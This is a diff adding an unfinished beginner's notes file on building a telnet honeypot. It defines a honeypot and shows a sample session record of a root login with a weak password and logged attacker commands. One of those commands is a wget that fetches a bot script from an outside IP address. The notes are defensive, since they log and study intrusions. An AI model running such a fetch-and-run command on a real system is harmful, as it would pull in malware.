@@ -1,0 +1,28 @@
+so here we are,
+making a telnet honeypot 
+
+first of all lets understand what a honeypot means?
+
+A Honeypot is a network-attached system used as a trap for cyber-attackers to detect and study the tricks and types of attacks used by hackers.
+source : https://www.geeksforgeeks.org/blogs/what-is-honeypot/
+
+now what is a telnet honeypot?
+
+
+well i am just starting with the structure called session which contains important information for the current session 
+like below given is one example of what a session will look like 
+{
+  "session_id": 42,
+  "client_ip": "45.83.91.122",
+  "username": "root",
+  "password": "123456",
+  "commands": [
+    "uname -a",
+    "id",
+    "wget http://185.234.219.10/bot.sh"
+  ],
+  "duration_seconds": 38,
+  "bytes_in": 214,
+  "bytes_out": 487
+}
+
